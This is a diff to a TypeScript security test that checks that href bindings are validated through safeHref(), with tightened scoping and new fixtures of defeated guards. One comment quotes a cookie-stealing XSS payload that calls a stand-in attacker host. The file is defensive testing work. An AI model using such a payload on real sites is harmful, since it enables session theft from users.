@@ -14,10 +14,16 @@
  * `web/src/util/markdown.test.ts`, which has a tree-wide `BANNED_SINKS`
  * scanner. That file does not exist at this commit -- it lives only on the
  * `markdown-sanitize` branch, which has not merged. Verified: `BANNED_SINKS`
- * has zero occurrences in this tree, and the only other `*.test.ts` under
- * `web/` is `src/utils/task-ready.test.ts`. So this rule ships as its own
+ * has zero occurrences in this tree. So this rule ships as its own
  * self-contained file, which also means it lands independently of that branch.
  * Folding the two scanners together is merge-time cleanup.
+ *
+ * (An earlier version of this note also said "the only other `*.test.ts` under
+ * `web/` is `src/utils/task-ready.test.ts`". That was true when written and is
+ * not now -- there are four. It is deleted rather than updated: a count of
+ * sibling test files is not this file's business to track, and a fact nobody
+ * maintains is how the sentence became false. scripts/run-tests.mjs discovers
+ * them, which is the only place the set needs to be known.)
  */
 import { existsSync, readdirSync, readFileSync, statSync } from 'node:fs';
 import { dirname, join, relative } from 'node:path';
@@ -63,13 +69,19 @@ interface Allowed {
   /** Why this binding cannot carry an attacker-controlled scheme. */
   readonly reason: string;
   /**
-   * If set, the interpolated identifier on THIS line must be assigned from
-   * `safeHref(...)` inside the same enclosing block.
+   * If set, the interpolated identifier on THIS line must be initialised from
+   * `safeHref(...)` and from nothing else, inside the innermost block enclosing
+   * this line.
    *
-   * This used to be a file-scoped check -- "the file imports safeHref
-   * somewhere" -- which is satisfied by a file that guards one binding and not
-   * the next one someone adds beside it. That is precisely the shape of the
-   * defect this scanner exists to catch, so it is now scoped to the binding.
+   * Three successively tighter versions, each fixing a measured fail-open:
+   *
+   *   1. "the file imports safeHref somewhere" -- satisfied by a file that
+   *      guards one binding and leaves the next one bare.
+   *   2. "some line in the enclosing block matches `id = safeHref(`" -- where
+   *      the block was the whole class, so a guarded method laundered a bare
+   *      sibling, and where the match was a prefix, so
+   *      `safeHref(url) || url` passed.
+   *   3. what is checked now. See enclosingBlock and assignsFromSafeHref.
    */
   readonly viaSafeHref?: boolean;
 }
@@ -154,33 +166,166 @@ function scanText(file: string, text: string): Finding[] {
 // ── assertions ───────────────────────────────────────────────────────────────
 
 /**
- * The nearest enclosing top-level construct around a 1-based line number:
- * from the last preceding line that starts at column 0 and opens a block, to
- * the first following line that is a closing brace at column 0.
+ * Blanks out `//` and block comments, and the contents of ordinary quoted
+ * strings, so brace counting and guard matching see code rather than prose.
  *
- * Deliberately crude. For a module-level `function foo() {` this is exactly the
- * function; for a line inside a class it widens to the whole class. Widening is
- * the safe direction -- it can only make the check more permissive than
- * intended, never wrongly fail a guarded binding -- and it still cuts the scope
- * down from "anywhere in the file", which was the actual hole.
+ * Characters are replaced with spaces rather than deleted, so every line keeps
+ * its length and every line keeps its index -- callers index back into the
+ * original text by line number.
+ *
+ * Template literals are deliberately left intact: their `${...}` braces balance,
+ * and the guarded bindings live inside them. The residual risk is a lone `{` or
+ * `}` in template HTML text, which would skew the depth count. Nothing in this
+ * tree has one; a future one would widen or narrow a block rather than silently
+ * approve a binding, and the anchored initialiser check below is what actually
+ * decides approval.
+ */
+function blankNonCode(text: string): string {
+  const out = text.split('');
+  let i = 0;
+  while (i < out.length) {
+    const c = text[i]!;
+    const next = text[i + 1];
+    if (c === '/' && next === '/') {
+      while (i < out.length && text[i] !== '\n') out[i++] = ' ';
+    } else if (c === '/' && next === '*') {
+      out[i++] = ' ';
+      out[i++] = ' ';
+      while (i < out.length && !(text[i] === '*' && text[i + 1] === '/')) {
+        if (text[i] !== '\n') out[i] = ' ';
+        i++;
+      }
+      if (i < out.length) {
+        out[i++] = ' ';
+        out[i++] = ' ';
+      }
+    } else if (c === '"' || c === "'") {
+      i++;
+      while (i < out.length && text[i] !== c && text[i] !== '\n') {
+        if (text[i] === '\\') out[i++] = ' ';
+        out[i] = ' ';
+        i++;
+      }
+      i++;
+    } else {
+      i++;
+    }
+  }
+  return out.join('');
+}
+
+/**
+ * The innermost block enclosing a 1-based line number, found by brace depth.
+ *
+ * WHAT THIS REPLACED, AND WHY. The previous version took "the last preceding
+ * line that starts at column 0 and opens a block" to "the first following line
+ * that is a closing brace at column 0", and its comment said: "for a line inside
+ * a class it widens to the whole class. Widening is the safe direction -- it can
+ * only make the check more permissive than intended, never wrongly fail a
+ * guarded binding".
+ *
+ * The first sentence was a correct measurement. The second was the wrong
+ * conclusion drawn from it. For a SECURITY check, more permissive IS the failure
+ * mode: the check exists to prove that THIS binding is guarded, and a scope that
+ * spans the whole class lets a guarded sibling method launder a bare one.
+ * Measured against the real scanner (deliverable D1(b)): a probe Lit class with
+ * a guarded method and an unguarded sibling passed with exit 0; de-guarding the
+ * sibling as a control made it fail. "Safe direction" was a sentence written
+ * above a measurement that said the opposite.
+ *
+ * So: walk back from the binding accumulating brace depth and stop at depth -1,
+ * which is the brace that opens the innermost enclosing block; then walk forward
+ * to its match. For a method in a class that is the method, not the class.
  */
 function enclosingBlock(lines: readonly string[], lineNo: number): readonly string[] {
-  const idx = lineNo - 1;
-  let start = 0;
-  for (let i = idx; i >= 0; i--) {
-    if (/^\S/.test(lines[i]!) && lines[i]!.includes('{')) {
-      start = i;
-      break;
+  const text = lines.join('\n');
+  const code = blankNonCode(text);
+
+  // Character offsets of the binding line within `text`.
+  let lineStart = 0;
+  for (let i = 0; i < lineNo - 1; i++) lineStart += lines[i]!.length + 1;
+  const lineEnd = lineStart + (lines[lineNo - 1]?.length ?? 0);
+
+  // Back to the opening brace of the innermost enclosing block.
+  let depth = 0;
+  let open = 0;
+  for (let i = lineStart - 1; i >= 0; i--) {
+    const c = code[i];
+    if (c === '}') depth++;
+    else if (c === '{') {
+      if (depth === 0) {
+        open = i;
+        break;
+      }
+      depth--;
     }
   }
-  let end = lines.length;
-  for (let i = idx + 1; i < lines.length; i++) {
-    if (/^\}/.test(lines[i]!)) {
-      end = i;
-      break;
+
+  // Forward to its match.
+  depth = 0;
+  let close = code.length;
+  for (let i = lineEnd; i < code.length; i++) {
+    const c = code[i];
+    if (c === '{') depth++;
+    else if (c === '}') {
+      if (depth === 0) {
+        close = i;
+        break;
+      }
+      depth--;
     }
   }
-  return lines.slice(start, end + 1);
+
+  return text.slice(open, close + 1).split('\n');
+}
+
+/**
+ * Whether `line` assigns `id` from safeHref() AND FROM NOTHING ELSE.
+ *
+ * WHAT THIS REPLACED, AND WHY. The check used to be the regex
+ * `\b<id>\s*=\s*safeHref\s*\(`, described as "the identifier is assigned from
+ * safeHref(...) inside the same enclosing block". It tests only that the
+ * initialiser BEGINS with a safeHref call. Measured against the real scanner
+ * (deliverable D1(a)): rewriting the guarded site as
+ *
+ *     const href = safeHref(url) || url || undefined;
+ *
+ * keeps the scanner green (exit 0, "url-binding-scan: ok") while safe-url.test.ts
+ * fails on a live `<a href="javascript:fetch('//attacker/'+document.cookie)">`.
+ * The guard is completely defeated and the guard-checker approves it.
+ *
+ * So the whole initialiser is checked, not its prefix: parentheses are balanced
+ * to find the end of the safeHref call, and what follows must be nothing but
+ * terminators. `|| url`, `?? url`, `+ suffix`, a ternary -- anything that can
+ * reintroduce the unvalidated value -- fails.
+ */
+function assignsFromSafeHref(line: string, id: string): boolean {
+  // Not `.href =` (a property write), not `==`/`===`/`=>`.
+  const lhs = new RegExp(`(?:^|[^\\w$.])${id}\\s*=(?![=>])\\s*`);
+  const m = lhs.exec(line);
+  if (!m) return false;
+
+  const rhs = line.slice(m.index + m[0].length);
+  const call = /^safeHref\s*\(/.exec(rhs);
+  if (!call) return false;
+
+  // Balance the call's parentheses.
+  let depth = 0;
+  let end = -1;
+  for (let i = call[0].length - 1; i < rhs.length; i++) {
+    if (rhs[i] === '(') depth++;
+    else if (rhs[i] === ')') {
+      depth--;
+      if (depth === 0) {
+        end = i;
+        break;
+      }
+    }
+  }
+  if (end < 0) return false;
+
+  // Nothing may follow but statement terminators.
+  return /^[\s;,)]*$/.test(rhs.slice(end + 1));
 }
 
 /**
@@ -243,6 +388,92 @@ function testPositiveFixtures(): void {
       `negative fixture "${name}" fired unexpectedly (${findings.map((f) => f.rule).join(', ')}): ${fixture}`,
     );
   }
+}
+
+/**
+ * Fixtures for the two guard-tracing mechanisms, which have their own recall
+ * and precision to prove. Both replaced a mechanism that measured something
+ * true and concluded something false, so both get direct fixtures rather than
+ * relying on the tree scan to exercise them.
+ */
+function testGuardTracing(): void {
+  const guarded: ReadonlyArray<readonly [string, string]> = [
+    ['plain const', 'const href = safeHref(url);'],
+    ['let', 'let href = safeHref(url);'],
+    ['reassignment', 'href = safeHref(this.task.remoteUrl);'],
+    ['nested parens in the argument', 'const href = safeHref(pick(a, (b) => b.url));'],
+    ['trailing whitespace', 'const href = safeHref(url) ;'],
+  ];
+  for (const [name, fixture] of guarded) {
+    assert(assignsFromSafeHref(fixture, 'href'), `guarded fixture "${name}" was rejected: ${fixture}`);
+  }
+
+  const notGuarded: ReadonlyArray<readonly [string, string]> = [
+    // The D1(a) finding: each of these begins with a safeHref call and each
+    // reinstates the unvalidated value. All five used to pass.
+    ['|| fallback', 'const href = safeHref(url) || url;'],
+    ['?? fallback', 'const href = safeHref(url) ?? url;'],
+    ['chained fallback', 'const href = safeHref(url) || url || undefined;'],
+    ['concatenation', "const href = safeHref(base) + '/' + path;"],
+    ['ternary', 'const href = cond ? safeHref(url) : url;'],
+    // Not a guard at all.
+    ['bare assignment', 'const href = url;'],
+    ['different identifier', 'const hrefRaw = safeHref(url);'],
+    ['property write, not a local', 'el.href = safeHref(url);'],
+    ['comparison', 'if (href === safeHref(url)) return;'],
+    ['a different function', 'const href = maybeSafeHref(url);'],
+  ];
+  for (const [name, fixture] of notGuarded) {
+    assert(
+      !assignsFromSafeHref(fixture, 'href'),
+      `fixture "${name}" was accepted as a guard but reinstates or never applies it: ${fixture}`,
+    );
+  }
+
+  // A commented-out guard must not count. blankNonCode is what makes this true,
+  // and it is applied to the block before matching.
+  assert(
+    !assignsFromSafeHref(blankNonCode('// const href = safeHref(url);'), 'href'),
+    'a commented-out assignment was accepted as a guard',
+  );
+  assert(
+    !assignsFromSafeHref(blankNonCode(' * e.g. `const href = safeHref(url);`'), 'href'),
+    'a docblock example was accepted as a guard',
+  );
+  // Positive control for blankNonCode: it must not blank live code.
+  assert(
+    assignsFromSafeHref(blankNonCode('const href = safeHref(url); // guarded'), 'href'),
+    'blankNonCode destroyed a real assignment; every rejection above would then be vacuous',
+  );
+
+  // The D1(b) finding: block scope must be the method, not the whole class.
+  const classText = [
+    'class Probe extends LitElement {', // 1
+    '  renderGuarded() {', // 2
+    '    const href = safeHref(this.a);', // 3
+    '    return html`<a href=${href}>a</a>`;', // 4
+    '  }', // 5
+    '', // 6
+    '  renderBare() {', // 7
+    '    const href = this.b;', // 8
+    '    return html`<a href=${href}>b</a>`;', // 9
+    '  }', // 10
+    '}', // 11
+  ];
+  const bareBlock = enclosingBlock(classText, 9);
+  assert(
+    !bareBlock.some((l) => assignsFromSafeHref(l, 'href')),
+    'the enclosing block of an unguarded binding reached a sibling method\'s guard, ' +
+      'so one guarded method would launder every bare binding in the class:\n' +
+      bareBlock.join('\n'),
+  );
+  // Positive control: the guarded method's own block must still find its guard,
+  // or the scoping is simply too tight and every viaSafeHref entry would fail.
+  const guardedBlock = enclosingBlock(classText, 4);
+  assert(
+    guardedBlock.some((l) => assignsFromSafeHref(l, 'href')),
+    'the enclosing block of a guarded binding lost its own guard:\n' + guardedBlock.join('\n'),
+  );
 }
 
 function testNoUnapprovedBindings(): void {
@@ -316,20 +547,24 @@ function testNoUnapprovedBindings(): void {
         `identifier, so the guard cannot be traced: ${a.line}`,
     );
 
-    const block = enclosingBlock(lines, finding.lineNo);
-    const assignment = new RegExp(`\\b${id}\\s*=\\s*safeHref\\s*\\(`);
+    // Comments are blanked before matching, so a commented-out assignment --
+    // or the worked example in a docblock -- cannot stand in for a real guard.
+    const block = enclosingBlock(lines, finding.lineNo).map((l) => blankNonCode(l));
     assert(
-      block.some((l) => assignment.test(l)),
+      block.some((l) => assignsFromSafeHref(l, id!)),
       `${a.file}:${finding.lineNo} is allow-listed as "href comes from safeHref()", but ` +
-        `nothing in the enclosing block assigns ${id} from safeHref(). The file importing ` +
-        'safeHref is not enough -- a file can guard one binding and leave the next one bare, ' +
-        `which is the defect this scanner exists to catch.\n  binding: ${a.line}`,
+        `nothing in the enclosing block assigns ${id} from safeHref() AND NOTHING ELSE. ` +
+        'The file importing safeHref is not enough -- a file can guard one binding and ' +
+        'leave the next one bare. Neither is an initialiser that merely starts with a ' +
+        `safeHref call: \`${id} = safeHref(x) || x\` reinstates the unvalidated value and ` +
+        `used to pass here.\n  binding: ${a.line}`,
     );
   }
 }
 
 function run(): void {
   testPositiveFixtures();
+  testGuardTracing();
   testNoUnapprovedBindings();
   console.log('url-binding-scan: ok');
 }
